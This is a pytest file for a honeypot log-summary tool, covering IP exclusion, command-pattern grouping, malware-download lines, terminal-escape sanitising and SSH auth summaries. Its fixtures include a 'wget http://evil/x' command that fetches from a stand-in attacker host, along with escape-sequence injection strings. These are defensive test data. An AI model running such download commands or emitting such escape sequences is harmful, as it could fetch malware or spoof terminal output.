"""Tests for tools/status_check.py.

test_exclude_ip_drops_events_with_no_src_ip_field is the important one: an
earlier ad-hoc version of this filtering (done by hand, not in this file)
filtered on each event's own src_ip field, which silently kept every
command.input/file.download event for an "excluded" IP -- those event
types don't carry src_ip at all, so `event.get("src_ip") != excluded_ip`
is trivially true for all of them. Filtering by session_id membership
(this file's actual approach) is what a regression here would need to
catch.
"""
from __future__ import annotations

import json
import subprocess
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "tools"))

from dashboard import Report  # noqa: E402
from status_check import _command_patterns, _download_line, _filter_excluded_ips  # noqa: E402


def _events(*rows):
    return list(rows)


def test_exclude_ip_drops_events_with_no_src_ip_field():
    events = _events(
        {"event": "session.connect", "session_id": "mine", "src_ip": "9.9.9.9", "protocol": "ssh"},
        {"event": "login.success", "session_id": "mine", "src_ip": "9.9.9.9", "username": "root"},
        {"event": "command.input", "session_id": "mine", "raw": "wget http://evil/x"},
        {"event": "file.download", "session_id": "mine", "outcome": "success", "url": "http://evil/x"},
        {"event": "session.connect", "session_id": "real", "src_ip": "1.2.3.4", "protocol": "ssh"},
        {"event": "login.success", "session_id": "real", "src_ip": "1.2.3.4", "username": "admin"},
    )
    filtered = _filter_excluded_ips(events, {"9.9.9.9"})
    assert all(e.get("session_id") != "mine" for e in filtered)
    assert any(e.get("session_id") == "real" for e in filtered)
    # the file.download with no src_ip field must be gone too, not kept
    assert not any(e.get("event") == "file.download" for e in filtered)


def test_exclude_ip_empty_set_is_a_no_op():
    events = _events({"event": "session.connect", "session_id": "a", "src_ip": "1.2.3.4", "protocol": "ssh"})
    assert _filter_excluded_ips(events, set()) == events


def test_command_patterns_groups_by_session_and_ignores_failed_logins():
    events = _events(
        {"event": "login.success", "session_id": "s1"},
        {"event": "command.input", "session_id": "s1", "raw": "id"},
        {"event": "command.input", "session_id": "s1", "raw": "uname -m"},
        {"event": "login.success", "session_id": "s2"},  # sends nothing
        {"event": "login.failed", "session_id": "s3"},
        {"event": "command.input", "session_id": "s3", "raw": "should not count"},
    )
    patterns = _command_patterns(Report(events))
    assert patterns[("id", "uname -m")] == 1
    assert patterns[()] == 1
    assert sum(patterns.values()) == 2  # only the two login.success sessions


def test_download_line_tags_stage_two_and_shows_elf_architecture():
    plain = _download_line({"timestamp": "T", "outcome": "success", "url": "http://x/bins.sh"})
    assert plain == "  T  success   http://x/bins.sh"
    stage2 = _download_line({"timestamp": "T", "outcome": "success", "url": "http://x/a.riscv64",
                             "stage": 2, "detected_machine": "EM_RISCV"})
    assert "[stage 2] http://x/a.riscv64" in stage2 and stage2.endswith("EM_RISCV")   # no bitness/endianness logged: just the name


def test_download_line_shows_bitness_and_endianness():
    line = _download_line({"timestamp": "T", "outcome": "success", "url": "http://x/gnome", "stage": 2,
                           "detected_machine": "EM_MIPS", "detected_bitness": 32,
                           "detected_endianness": "big"})
    assert line.endswith("EM_MIPS 32-bit big")


def test_piping_into_head_exits_quietly(tmp_path):
    """`status_check.py | head -4` used to end in a BrokenPipeError traceback.
    The output is made larger than a pipe buffer, so the tool is certainly still
    writing when the reader hangs up."""
    events = tmp_path / "events.jsonl"
    events.write_text("".join(
        json.dumps({"timestamp": "2026-09-20T09:00:00Z", "event": "file.download", "session_id": f"s{i}",
                    "url": f"http://198.51.100.1/{'x' * 80}{i}", "outcome": "failed"}) + "\n"
        for i in range(4000)))
    tool = Path(__file__).resolve().parent.parent / "tools" / "status_check.py"

    proc = subprocess.Popen([sys.executable, str(tool), "--events", str(events)],
                            stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    proc.stdout.readline()
    proc.stdout.close()
    stderr = proc.stderr.read()

    assert proc.wait(timeout=30) == 0
    assert b"Traceback" not in stderr and b"BrokenPipe" not in stderr and b"Exception ignored" not in stderr


def test_download_line_shows_the_decoded_abi_or_else_the_raw_flags():
    base = {"timestamp": "T", "outcome": "success", "url": "http://x/a", "stage": 2,
            "detected_machine": "EM_ARM", "detected_bitness": 32, "detected_endianness": "little"}
    assert _download_line({**base, "detected_flags": 0x05000400, "detected_abi": "EABI5 hard-float"}
                          ).endswith("EM_ARM 32-bit little EABI5 hard-float")
    ppc = {**base, "detected_machine": "EM_PPC", "detected_flags": 0x10000, "detected_abi": None}
    assert _download_line(ppc).endswith("EM_PPC 32-bit little flags=0x10000")
    assert _download_line({**ppc, "detected_flags": 0}).endswith("EM_PPC 32-bit little")     # zero is noise


# -- terminal safety ---------------------------------------------------------------

def test_printable_shows_control_and_invisible_characters_instead_of_emitting_them():
    from status_check import _printable
    hostile = "a\x1b]0;pwned\x07b\r\nfake row\x7f\x9b31m‮evil​﻿"
    shown = _printable(hostile)
    assert "\x1b" not in shown and "\x07" not in shown and "\n" not in shown and "\r" not in shown
    assert "\x7f" not in shown and "\x9b" not in shown and "‮" not in shown and "​" not in shown
    assert shown == "a\\x1b]0;pwned\\x07b\\x0d\\x0afake row\\x7f\\x9b31m\\u202eevil\\u200b\\ufeff"


def test_printable_leaves_ordinary_text_alone():
    from status_check import _printable
    assert _printable("root") == "root"
    assert _printable("http://1.2.3.4/a?b=c&d=é 日本語") == "http://1.2.3.4/a?b=c&d=é 日本語"
    assert _printable(None) == "None" and _printable(42) == "42"


def _evt(event: str, **kw) -> str:
    return json.dumps({"timestamp": kw.pop("timestamp", "2026-09-20T09:00:00Z"), "event": event, **kw}) + "\n"


def _run_status_check(monkeypatch, capsys, path: Path, *extra: str) -> str:
    import status_check
    monkeypatch.setattr(sys, "argv", ["status_check.py", "--events", str(path), *extra])
    status_check.main()
    return capsys.readouterr().out


def test_output_never_contains_attacker_supplied_escape_sequences(tmp_path, monkeypatch, capsys):
    evil = "root\x1b]0;PWNED\x07\nFAKE ROW‮"
    log = tmp_path / "events.jsonl"
    log.write_text(
        _evt("session.connect", session_id="a", src_ip="1.1.1.1", protocol="ssh")
        + _evt("session.client_version", session_id="a", client_id="SSH-2.0-\x1b[2J" + "x")
        + _evt("login.success", session_id="a", src_ip="1.1.1.1", username=evil, password="p")
        + _evt("login.success", session_id="a", src_ip="1.1.1.1", username=evil, password="p")
        + _evt("auth.attempt", session_id="a", src_ip="1.1.1.1", method="publickey", username=evil,
               key_type="ssh-ed25519\x1b", key_fingerprint="SHA256:\x1b[31mabc")
        + _evt("file.download", session_id="a", url="http://198.51.100.1/\x1b[2Jx\nFAKE", outcome="success\x07",
               detected_machine="EM_ARM\x1b")
    )
    out = _run_status_check(monkeypatch, capsys, log)
    assert "\x1b" not in out and "\x07" not in out and "‮" not in out
    assert "\nFAKE" not in out                                   # a newline in data cannot start a fake row
    assert "\\x1b" in out                                        # ...it is shown, visibly, instead


# -- SSH client / auth summary --------------------------------------------------------

def _ssh_events() -> list[dict]:
    def e(event, **kw):
        return {"timestamp": "2026-09-20T09:00:00Z", "event": event, **kw}
    ev = []
    for sid, ip, ver in [("s1", "1.1.1.1", "SSH-2.0-Go"), ("s2", "2.2.2.2", "SSH-2.0-Go"),
                         ("s3", "3.3.3.3", "SSH-2.0-libssh_0.9"), ("s4", "4.4.4.4", "SSH-2.0-Go")]:
        ev += [e("session.connect", session_id=sid, src_ip=ip, protocol="ssh"),
               e("session.client_version", session_id=sid, client_id=ver)]
    # the same key from two IPs, another key from one
    ev += [e("auth.attempt", session_id="s1", src_ip="1.1.1.1", method="publickey", username="root",
             key_type="ssh-ed25519", key_fingerprint="SHA256:shared"),
           e("auth.attempt", session_id="s2", src_ip="2.2.2.2", method="publickey", username="root",
             key_type="ssh-ed25519", key_fingerprint="SHA256:shared"),
           e("auth.attempt", session_id="s3", src_ip="3.3.3.3", method="publickey", username="pi",
             key_type="ssh-rsa", key_fingerprint="SHA256:alone"),
           e("auth.attempt", session_id="s4", src_ip="4.4.4.4", method="none", username="admin")]
    # s4 sat there for a minute with no credentials; s3 too but it did log in; s2 was brief
    ev += [e("session.closed", session_id="s4", duration_seconds=59.9),
           e("login.failed", session_id="s3", username="pi", password="x", src_ip="3.3.3.3"),
           e("session.closed", session_id="s3", duration_seconds=61.0),
           e("session.closed", session_id="s2", duration_seconds=0.3)]
    return ev


def test_ssh_summary_counts_clients_shared_keys_and_silent_sessions():
    from status_check import _ssh_summary
    text = "\n".join(_ssh_summary(_ssh_events()))
    assert "SSH client versions (4 sessions, 2 distinct):" in text
    assert "    3  SSH-2.0-Go" in text and "    1  SSH-2.0-libssh_0.9" in text
    assert "Non-password auth attempts: 4 (publickey 3, none 1), 2 distinct public keys" in text
    shared = text.split("more than one source IP")[1].split("Usernames")[0]
    assert "2 IPs  ssh-ed25519  SHA256:shared" in shared and "SHA256:alone" not in shared
    assert "root x2" in text
    # only s4 qualifies as silent: s3 tried a login, s2 left at once
    assert "held open > 30s without trying a login or command (1):" in text
    assert "4.4.4.4" in text and "none" in text


def test_ssh_summary_is_empty_for_a_log_from_before_those_events_existed():
    from status_check import _ssh_summary
    old = [{"timestamp": "T", "event": "session.connect", "session_id": "a", "src_ip": "1.1.1.1"},
           {"timestamp": "T", "event": "session.closed", "session_id": "a", "duration_seconds": 0.2}]
    assert _ssh_summary(old) == []


def test_exclude_ip_also_removes_a_visitor_from_the_ssh_summary(tmp_path, monkeypatch, capsys):
    log = tmp_path / "events.jsonl"
    log.write_text("".join(json.dumps(e) + "\n" for e in _ssh_events()))
    out = _run_status_check(monkeypatch, capsys, log, "--exclude-ip", "4.4.4.4")
    assert "SSH client versions (3 sessions" in out
    assert "held open" not in out            # the only silent session was 4.4.4.4's
